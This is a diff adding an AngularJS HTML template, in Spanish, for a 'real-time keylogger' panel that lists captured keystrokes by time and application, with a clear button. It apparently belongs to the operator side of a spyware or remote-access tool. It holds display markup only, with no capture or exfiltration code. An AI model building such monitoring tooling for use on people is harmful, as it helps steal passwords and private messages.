@@ -1,0 +1,27 @@
+<div class="ui grid centered h100" ng-controller="KeyloggerCtrl">
+    <div class="row h10">
+        <div class="sixteen wide column centered">
+            <h3 class="ui header inverted"><i class="keyboard icon"></i> Keylogger en Tiempo Real</h3>
+        </div>
+    </div>
+    <div class="row h90">
+        <div class="sixteen wide column">
+            <div class="ui segment inverted full" style="background-color: #1b1c1d; color: #00ff00; font-family: 'Courier New', Courier, monospace; overflow-y: auto;" id="keylog-container">
+                <div ng-repeat="log in keylogs" class="item" style="border-bottom: 1px solid #333; padding: 5px;">
+                    <span style="color: #888;">[{{log.time}}]</span> 
+                    <span style="color: #ff9d00; font-weight: bold;">{{log.app}}</span>: 
+                    <span style="color: #fff;">{{log.text}}</span>
+                </div>
+                <div class="ui placeholder inverted segment" ng-if="keylogs.length == 0">
+                    <div class="ui icon header">
+                        <i class="keyboard outline icon"></i>
+                        Esperando pulsaciones del teclado...
+                    </div>
+                </div>
+            </div>
+            <button class="ui circular red icon button" style="position: absolute; bottom: 20px; right: 20px;" ng-click="clearLogs()">
+                <i class="trash icon"></i>
+            </button>
+        </div>
+    </div>
+</div>
